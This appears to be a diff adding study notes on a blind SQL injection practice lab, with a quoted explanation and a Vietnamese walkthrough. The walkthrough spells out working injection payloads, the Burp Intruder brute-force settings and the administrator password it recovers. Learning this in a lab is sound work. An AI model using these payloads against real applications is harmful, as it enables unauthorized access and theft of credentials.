@@ -1,0 +1,123 @@
+1. Note:
+    Exploiting blind SQL injection by triggering conditional responses
+    Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
+
+        Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
+    When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:
+
+        SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+    This query is vulnerable to SQL injection, but the results from the query are not returned to the user. 
+    However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, 
+    the query returns data and you receive a "Welcome back" message in the response.
+
+    This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.
+
+    To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:
+
+        …xyz' AND '1'='1
+        …xyz' AND '1'='2
+    The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
+    The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.
+    This allows us to determine the answer to any single injected condition, and extract data one piece at a time.
+
+    For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.
+
+    To do this, start with the following input:
+
+        xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
+    This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than m.
+
+    Next, we send the following input:
+
+    xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
+    This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than t.
+
+    2. Lab:
+        This lab contains a blind SQL injection vulnerability. 
+        The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+        The results of the SQL query are not returned, and no error messages are displayed. 
+        But the application includes a "Welcome back" message in the page if the query returns any rows.
+
+        The database contains a different table called users, with columns called username and password. 
+        You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+        To solve the lab, log in as the administrator user.
+    
+    3. Submit:
+
+        Bước 1: Kiểm tra xem có sử dụng được Blind sql injection không?
+
+            ' AND '1' = '1
+            Hiển thị dòng: Welcome back!
+
+            ' AND '1' = '2
+            Không hiển thị.
+        
+        => Sử dụng được Blind sql 
+
+        Bước 2: Kiểm tra password của tài khoản administrator của table users có bao nhiêu kí tự
+
+            Cách 1: Làm thủ công:
+                ' (select username from users where username = 'administrator' AND length(password) > 1) = 'administrator
+                => có từ 2 ký tự trở lên
+
+                ' (select username from users where username = 'administrator' AND length(password) > 2) = 'administrator 
+                => có từ 3 ký tự trở lên
+
+                ' (select username from users where username = 'administrator' AND length(password) > 3) = 'administrator
+                => có từ 4 ký tự trở lên
+
+                ... Làm tương tự 
+
+                Ta thấy password có 20 ký tự và kiểm tra lại xem
+
+                cH6R6nfV46ApbTwh' and (select username from users where username = 'administrator' AND LENGTH(password) = 20)='administrator
+             
+                => Hiển thị dòng: Welcome back!
+
+            Cách 2: Dùng burp suite để brute force
+                Phần mình sẽ brute force 
+                    TrackingId=cH6R6nfV46ApbTwh
+                    '%20and%20(select%20username%20from%20users%20where%20username%20%3d%20'administrator'%20AND%20LENGTH(password)%20%3e%201)%3d'administrator; 
+                B1: Send to Instruder vào phần Position
+
+                    Gán giá trị cần brute force ở giá trị 1
+                    
+                    LENGTH(password)%20%3e%20$1$
+
+                B2: Qua phần Payloads để kiểu Payloads là number vào cho chạy từ 1 đến 50
+                     From: 1
+                     To: 50
+                     Step: 1
+
+                B3: Start attack:
+                    Ở số 19 thì Length: 5399
+                    Ở số 20 thì Length: 5338
+                
+                => Password có 20 ký tự
+            
+            Bước 3:Bute force mật khẩu
+                1. Dùng payload 
+                    ' and SUBSTRING((select password from users where username = 'administrator'),1,1)='a
+                
+                2. Chuyển sang intruder ,Positions và chọn attack type: Cluster bomb
+                    add 2 Position payload là vị trí 1 và chữ a
+                        ,§1§,1)='§a§
+
+                3. Chuyển sang phần Payloads thì 
+                    payload set: 1
+                    Type: numbers
+                    From: 1
+                    To: 20 (Vì có 20 ký tự)
+                    Step: 1
+
+                    payload set: 2
+                    Type: brute force
+                    Min length: 1
+                    Max length: 1
+
+                4. Start attack
+                        username: administrator
+                        password: s7kipac9n6xoxcrwigea
+                
